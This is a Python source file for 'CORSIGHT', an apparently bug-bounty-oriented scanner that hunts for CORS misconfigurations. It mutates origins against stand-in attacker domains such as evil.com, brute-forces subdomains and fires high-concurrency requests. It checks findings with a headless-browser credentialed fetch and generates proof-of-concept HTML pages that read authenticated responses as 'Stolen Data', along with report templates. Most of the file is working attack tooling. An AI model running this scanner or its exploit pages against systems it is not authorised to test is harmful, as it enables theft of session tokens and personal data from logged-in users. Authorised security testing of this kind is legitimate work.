#!/usr/bin/env python3
"""                                         
 _____ _____ _____ _____ _____ _____ _____ _____ 
|     |     | __  |   __|     |   __|  |  |_   _|
|   --|  |  |    -|__   |-   -|  |  |     | | |  
|_____|_____|__|__|_____|_____|_____|__|__| |_|  
                                                
"""

import argparse
import asyncio
import json
import os
import random
import re
import string
import sys
import logging
import socket
import time
from datetime import datetime
from typing import List, Dict, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse

# ---------- Auto-Installer ----------
def install_package(package: str) -> None:
    import subprocess
    print(f"[*] Installing required package: {package}...")
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", package],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

REQUIRED_PACKAGES = {
    "aiohttp": "aiohttp",
    "termcolor": "termcolor",
}

try:
    import aiohttp
    from termcolor import colored, cprint
except ImportError as e:
    missing_library = str(e).split("'")[1]
    install_package(missing_library)
    os.execl(sys.executable, sys.executable, *sys.argv)

# Playwright optional check
try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# ---------- Configuration ----------
DEFAULT_USER_AGENT = "CORSIGHT/4.3 (Professional Edition)"
REQUEST_TIMEOUT = aiohttp.ClientTimeout(total=15, connect=5)
MAX_RETRIES = 2
RETRY_BACKOFF = 1
DEFAULT_CONCURRENCY = 50
DEFAULT_DELAY = 0.05
DEFAULT_PER_DOMAIN_CONCURRENCY = 10
REQUIRED_STATUS_CODES = range(200, 300)
TRIVIAL_BODIES = {"", "{}", "[]", "null", "ok", "true", "false", "success", "error", " "}
ATTACKER_DOMAINS = ["corsfinder.com", "gorrlt.com", "evil.com", "attacker.com"]
SUBDOMAIN_WORDLIST = [
    "api", "dev", "test", "stage", "admin", "v1", "v2", "corp", "internal", 
    "sandbox", "stg", "prod", "beta", "demo", "app", "auth", "login",
    "staging", "uat", "mobile", "graphql", "cdn", "files", "assets", "gateway"
]

# ---------- Logging ----------
logging.basicConfig(level=logging.WARNING, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("corsight")

# ---------- Banner ----------
def show_banner() -> None:
    os.system("cls" if os.name == "nt" else "clear")
    print(colored(r"""                                     
 _____ _____ _____ _____ _____ _____ _____ _____ 
|     |     | __  |   __|     |   __|  |  |_   _|
|   --|  |  |    -|__   |-   -|  |  |     | | |    CORSIGHT v1.3 
|_____|_____|__|__|_____|_____|_____|__|__| |_|  
    """, "cyan", attrs=["bold"]))
    print(colored("             BE HUNT • CLAIM BOUNTY", "magenta", attrs=["bold"]))
    print(colored("              Dev by INTELEON404", "white"))
    print(colored("=" * 88, "grey"))

# ---------- Utilities ----------
def beep() -> None:
    print('\a', end='', flush=True)
    if os.name == 'nt':
        try:
            import winsound
            winsound.Beep(2500, 300)
        except: pass

def normalize_domain(target: str) -> str:
    return urlparse(target).netloc.split(":")[0]

def safe_filename(s: str) -> str:
    return re.sub(r'[^\w\-_\.]', '_', s).strip('_')

async def check_dns_wildcard(domain: str) -> bool:
    """Checks for DNS wildcard records to reduce false positives in subdomain discovery."""
    random_sub = ''.join(random.choices(string.ascii_lowercase, k=15)) + "." + domain
    loop = asyncio.get_running_loop()
    try:
        await loop.getaddrinfo(random_sub, None)
        return True
    except:
        return False

def get_severity(url: str, is_exploitable: bool, credentials_allowed: bool) -> str:
    """Calculates severity based on path sensitivity and exploitability."""
    critical_keywords = ["admin", "auth", "login", "password", "session", "userinfo", "profile", "billing", "settings", "me", "account"]
    high_keywords = ["api", "v1", "v2", "graphql", "internal", "config", "user"]
    path = urlparse(url).path.lower()
    
    severity = "LOW"
    if any(k in path for k in critical_keywords):
        severity = "CRITICAL" if credentials_allowed and is_exploitable else "HIGH"
    elif any(k in path for k in high_keywords):
        severity = "HIGH" if is_exploitable else "MEDIUM"
    elif credentials_allowed and is_exploitable:
        severity = "MEDIUM"
        
    return severity

# ---------- AI Origin Mutation Engine (v5-Refined) ----------
def generate_origins(domain: str, include_null: bool = True) -> List[str]:
    """Mutation engine using OWASP and advanced bypass patterns."""
    mutations = set()
    def rand_sub(): return ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(5, 10)))
    
    # 1. Classic Suffix/Prefix Bypass
    mutations.add(f"https://{domain}.evil.com")
    mutations.add(f"https://{domain}.attacker.com")
    mutations.add(f"https://evil{domain}.com")
    mutations.add(f"https://{domain}-evil.com")
    mutations.add(f"https://{domain}.local")
    
    # 2. Advanced Professional Bypass Patterns (Regex Misconfig)
    for attacker in ATTACKER_DOMAINS:
        mutations.add(f"https://{domain}.com.{attacker}") # TLD Confusion
        mutations.add(f"https://{attacker}/{domain}")    # Path-based
        mutations.add(f"https://{attacker}?{domain}")    # Query-based
        mutations.add(f"https://{attacker}@{domain}.com") # Auth bypass trick
        mutations.add(f"https://{domain}%00.{attacker}") # Null Byte injection
        mutations.add(f"https://{domain}.{attacker}.{rand_sub()}.com")
    
    # 3. Subdomain Fuzzing
    mutations.add(f"https://{rand_sub()}{domain}.com")
    mutations.add(f"https://{domain}.attacker.co")
    
    for _ in range(3):
        mutations.add(f"https://{rand_sub()}.{domain}")
    
    if include_null:
        mutations.add("null")
        
    return list(mutations)

def is_trivial_body(body: bytes) -> bool:
    if not body: return True
    try:
        text = body.decode(errors='ignore').strip().lower()
    except: return False
    return text in TRIVIAL_BODIES or len(text) < 3

def truncate_body_preview(body: bytes, max_len=60) -> str:
    if not body: return "<empty>"
    preview = body[:max_len].decode(errors='ignore').replace('\n', ' ').strip()
    if len(body) > max_len: preview += "..."
    return preview

# ---------- Request Handling and Preflight Validation ----------
async def fetch_with_retry(
    session: aiohttp.ClientSession,
    url: str,
    origin: str,
    method: str = "GET",
    preflight: bool = False,
    insecure: bool = False,
) -> Optional[Tuple[int, Dict[str, str], bytes]]:
    headers = {"Origin": origin, "User-Agent": DEFAULT_USER_AGENT}
    if preflight:
        headers.update({
            "Access-Control-Request-Method": method,
            "Access-Control-Request-Headers": "X-Requested-With,Content-Type,Authorization",
        })

    for attempt in range(MAX_RETRIES + 1):
        try:
            async with session.request(
                method if not preflight else "OPTIONS",
                url,
                headers=headers,
                ssl=not insecure,
                allow_redirects=True,
                timeout=REQUEST_TIMEOUT
            ) as resp:
                body = await resp.read()
                headers_lower = {k.lower(): v for k, v in resp.headers.items()}
                return (resp.status, headers_lower, body)
        except Exception:
            if attempt < MAX_RETRIES:
                await asyncio.sleep(RETRY_BACKOFF * (attempt + 1))
    return None

def is_vulnerable_response(status: int, headers: Dict[str, str], body: bytes, origin: str, preflight: bool = False) -> Tuple[bool, str]:
    if status not in REQUIRED_STATUS_CODES and status != 204: 
        return False, f"status {status}"

    acao = headers.get("access-control-allow-origin", "").strip()
    acac = headers.get("access-control-allow-credentials", "").lower()

    # Browser Security Logic
    if acao.startswith("*."):
        return False, "Invalid wildcard origin (Browsers will block)"
    
    if acao == "*" and acac == "true":
        return False, "Browsers block wildcard with credentials"
    
    if acao != origin:
        return False, "Origin reflection failed"

    if acac != "true":
        return False, "Credentials not allowed"

    # Preflight (OPTIONS) specific checks
    if preflight:
        acam = headers.get("access-control-allow-methods", "").upper()
        if "GET" not in acam and "*" not in acam:
            return False, "Method not allowed (ACAM check failed)"

    if is_trivial_body(body) and status != 204:
        return False, "Trivial or empty response body"

    return True, "Exploitable"

# ---------- Advanced Browser Exploit Engine ----------
async def browser_validate(url: str, origin: str) -> bool:
    """Performs real cross-origin fetch simulation via a headless browser."""
    if not PLAYWRIGHT_AVAILABLE:
        return True 

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()

            # Cross-origin request simulation using Data URI
            payload = f"""
            <html><body><script>
                (async () => {{
                    try {{
                        const res = await fetch('{url}', {{
                            method: 'GET',
                            credentials: 'include',
                            mode: 'cors'
                        }});
                        const data = await res.text();
                        window.readSuccess = data.length > 0;
                    }} catch (e) {{
                        window.readSuccess = false;
                    }}
                }})();
            </script></body></html>
            """
            import base64
            b64_payload = base64.b64encode(payload.encode()).decode()
            
            await page.goto(f"data:text/html;base64,{b64_payload}")
            
            # Wait for async fetch to finish
            start_wait = time.time()
            result = False
            while time.time() - start_wait < 5.0:
                result = await page.evaluate("window.readSuccess")
                if result: break
                await asyncio.sleep(0.5)
                
            await browser.close()
            return bool(result)
    except Exception as e:
        logger.debug(f"Browser validation failed: {e}")
        return False

# ---------- Bug Bounty Report Generator ----------
def generate_bounty_report(finding: Dict) -> str:
    """Generates a professional bug bounty report."""
    return f"""# {finding['severity']} - CORS Misconfiguration on {normalize_domain(finding['url'])}

## 1. Summary
A Cross-Origin Resource Sharing (CORS) misconfiguration was discovered on the endpoint `{finding['url']}`. The server dynamically reflects the `Origin` header and sets `Access-Control-Allow-Credentials: true`. This allows an attacker to perform authenticated requests from an unauthorized domain and read sensitive response data.

## 2. Vulnerable Endpoint
- **Target URL**: `{finding['url']}`
- **Attacker-Controlled Origin**: `{finding['origin']}`
- **HTTP Method**: `{finding['method']}`
- **Severity**: **{finding['severity']}**

## 3. Impact
An attacker can host a malicious script that, when visited by a logged-in victim, steals private information (e.g., CSRF tokens, PII, session data) from the vulnerable endpoint. This can lead to account takeover or sensitive data leakage.

## 4. Proof of Concept
Save the following as `exploit.html` and host it on `{finding['origin']}`:

```html
<html>
  <body>
    <h2>CORS Exploit PoC</h2>
    <div id="data">Waiting for response...</div>
    <script>
      fetch("{finding['url']}", {{
        method: "{finding['method']}",
        credentials: "include"
      }})
      .then(response => response.text())
      .then(data => {{
        document.getElementById('data').innerText = "Stolen Data: " + data;
      }})
      .catch(err => console.error("Error:", err));
    </script>
  </body>
</html>
```

## 5. Evidence
**Request:**
```http
{finding['method']} {urlparse(finding['url']).path} HTTP/1.1
Host: {normalize_domain(finding['url'])}
Origin: {finding['origin']}
```

**Response:**
```http
HTTP/1.1 {finding['status']} OK
Access-Control-Allow-Origin: {finding['acao']}
Access-Control-Allow-Credentials: {finding['acac']}

{finding['body_preview']}
```
"""

# ---------- Scanning Architecture ----------
class ScanWorker:
    def __init__(self, session, global_sem, domain_sems, stats, findings, args):
        self.session = session
        self.global_sem = global_sem
        self.domain_sems = domain_sems
        self.stats = stats
        self.findings = findings
        self.args = args
        self.queue = asyncio.Queue(maxsize=max(args.threads * 200, 5000)) 
        self.stats_lock = asyncio.Lock()
        self.findings_lock = asyncio.Lock()
        self.seen_findings = set()

    async def worker_loop(self):
        while True:
            item = await self.queue.get()
            if item is None:
                self.queue.task_done()
                break
            url, origin, method, preflight = item
            await self.test_endpoint(url, origin, method, preflight)
            self.queue.task_done()

    async def test_endpoint(self, url, origin, method, preflight):
        domain = normalize_domain(url)
        domain_sem = self.domain_sems.get(domain)
        if not domain_sem:
            domain_sem = asyncio.Semaphore(DEFAULT_PER_DOMAIN_CONCURRENCY)
            self.domain_sems[domain] = domain_sem

        async with self.global_sem, domain_sem:
            await asyncio.sleep(self.args.delay + random.uniform(0, 0.1))
            result = await fetch_with_retry(self.session, url, origin, method, preflight, self.args.insecure)

        async with self.stats_lock:
            self.stats["requests_sent"] += 1
            if result is None:
                self.stats["requests_failed"] += 1
                return
            self.stats["requests_success"] += 1

        status, headers, body = result
        is_vuln, reason = is_vulnerable_response(status, headers, body, origin, preflight)
        if not is_vuln: return

        is_exploitable = True
        if self.args.validate:
            is_exploitable = await browser_validate(url, origin)
            if not is_exploitable: return

        finding_key = (url, origin, method)
        async with self.findings_lock:
            if finding_key not in self.seen_findings:
                self.seen_findings.add(finding_key)
                finding = {
                    "url": url, "origin": origin, "method": method,
                    "status": status, "acao": headers.get("access-control-allow-origin", ""),
                    "acac": headers.get("access-control-allow-credentials", ""),
                    "body_length": len(body), "body_preview": truncate_body_preview(body),
                    "severity": get_severity(url, is_exploitable, headers.get("access-control-allow-credentials", "") == "true")
                }
                self.findings.append(finding)
                print(colored(f"\n[!] {finding['severity']} Vulnerability Found: {url} | Origin: {origin}", "red" if finding['severity']=="CRITICAL" else "yellow", attrs=["bold"]))
                if self.args.beep: beep()

# ---------- Subdomain Brute Fuzzing ----------
async def brute_subdomains(domain: str) -> List[str]:
    discovered = []
    cprint(f"[*] Brute-forcing subdomains for: {domain}...", "cyan")
    sub_sem = asyncio.Semaphore(30)
    
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
        async def check(url):
            async with sub_sem:
                try:
                    async with session.get(url, allow_redirects=True, ssl=False) as r:
                        # Improved: status < 400 reduces noise
                        if r.status < 400:
                            discovered.append(url)
                except: pass
        
        tasks = [check(f"https://{sub}.{domain}") for sub in SUBDOMAIN_WORDLIST]
        await asyncio.gather(*tasks)
    return list(set(discovered))

# ---------- Scan Controller ----------
async def run_scanner(targets, paths, args):
    stats = {"requests_sent": 0, "requests_failed": 0, "requests_success": 0, "domains_scanned": len(targets)}
    findings = []
    global_sem = asyncio.Semaphore(args.threads)
    domain_sems = {}

    if args.subdomain_brute:
        extra = []
        for t in targets: 
            domain = normalize_domain(t)
            if not await check_dns_wildcard(domain):
                extra.extend(await brute_subdomains(domain))
        targets = list(set(targets + extra))
        stats["domains_scanned"] = len(targets)

    async with aiohttp.ClientSession(timeout=REQUEST_TIMEOUT) as session:
        worker_instance = ScanWorker(session, global_sem, domain_sems, stats, findings, args)
        num_workers = min(args.threads, 40)
        workers = [asyncio.create_task(worker_instance.worker_loop()) for _ in range(num_workers)]

        for target in targets:
            if not target.startswith("http"): target = "https://" + target
            domain = normalize_domain(target)
            origins = generate_origins(domain, include_null=not args.no_null_origin)
            if args.max_origins: origins = origins[:args.max_origins]
            
            for path in paths:
                url = urljoin(target, path.lstrip("/"))
                for origin in origins:
                    # Test standard GET and Preflight OPTIONS
                    await worker_instance.queue.put((url, origin, "GET", False))
                    await worker_instance.queue.put((url, origin, "GET", True))

        await worker_instance.queue.join()
        for _ in range(num_workers): await worker_instance.queue.put(None)
        await asyncio.gather(*workers)

    return findings, stats

# ---------- Main Execution ----------
async def main() -> None:
    parser = argparse.ArgumentParser(description="CORSIGHT v4.3 - Professional CORS Scanner")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Single target URL")
    group.add_argument("-i", "--input", help="URL list input file")
    parser.add_argument("-p", "--paths", default="/,/api,/v1,/userinfo,/graphql,/me,/account,/session,/settings,/profile,/api/user,/api/auth,/api/profile,/api/session,/config,/admin", help="Comma-separated path list")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Concurrency level")
    parser.add_argument("-d", "--delay", type=float, default=0.05, help="Request delay")
    parser.add_argument("--max-origins", type=int, help="Limit mutations per domain")
    parser.add_argument("--insecure", action="store_true", help="Skip SSL verification")
    parser.add_argument("--no-null-origin", action="store_true", help="Exclude 'null' origin")
    parser.add_argument("--validate", action="store_true", help="Enable browser validation")
    parser.add_argument("--subdomain-brute", action="store_true", help="Enable subdomain brute-forcing")
    parser.add_argument("--poc", action="store_true", help="Generate PoC files")
    parser.add_argument("--report", action="store_true", help="Generate Markdown reports")
    parser.add_argument("--beep", action="store_true", help="Sound alert on finding")
    parser.add_argument("--output", help="Output directory name")
    args = parser.parse_args()

    show_banner()
    if args.url: targets = [args.url]
    else:
        try:
            with open(args.input) as f: targets = [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            cprint(f"[!] Error: File '{args.input}' not found.", "red")
            return

    paths = [p.strip() for p in args.paths.split(",")]
    start_time = time.time()
    
    findings, stats = await run_scanner(targets, paths, args)
    
    duration = time.time() - start_time
    rps = stats["requests_sent"] / duration if duration > 0 else 0
    success_rate = (stats["requests_success"] / stats["requests_sent"] * 100) if stats["requests_sent"] > 0 else 0
    
    cprint(f"\n[+] Scan finished in {duration:.2f} seconds.", "cyan", attrs=["bold"])
    print(f"    Domains Scanned      : {stats['domains_scanned']}")
    print(f"    Requests Sent        : {stats['requests_sent']}")
    print(f"    Requests Per Second  : {rps:.2f}")
    print(f"    Success Rate         : {success_rate:.2f}%")
    print(f"    Vulnerabilities Found: {len(findings)}")

    if findings:
        out_dir = args.output or f"corsight_results_{datetime.now().strftime('%m%d_%H%M%S')}"
        os.makedirs(out_dir, exist_ok=True)
        for idx, f in enumerate(findings):
            tag = safe_filename(normalize_domain(f['url']))
            
            # Save PoC
            if args.poc:
                with open(os.path.join(out_dir, f"poc_{idx}_{tag}.html"), "w") as pf:
                    pf.write(f"<!-- Vulnerable URL: {f['url']} -->\n")
                    pf.write(f"<html><body><script>fetch('{f['url']}',{{credentials:'include'}}).then(r=>r.text()).then(d=>alert('Data Stolen from {tag}: '+d))</script></body></html>")
            
            # Save Report
            if args.report:
                with open(os.path.join(out_dir, f"report_{idx}_{tag}.md"), "w") as rf:
                    rf.write(generate_bounty_report(f))
                    
        cprint(f"[+] All files saved to directory: {out_dir}", "green")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        cprint("\n[!] Scan stopped by user.", "yellow")
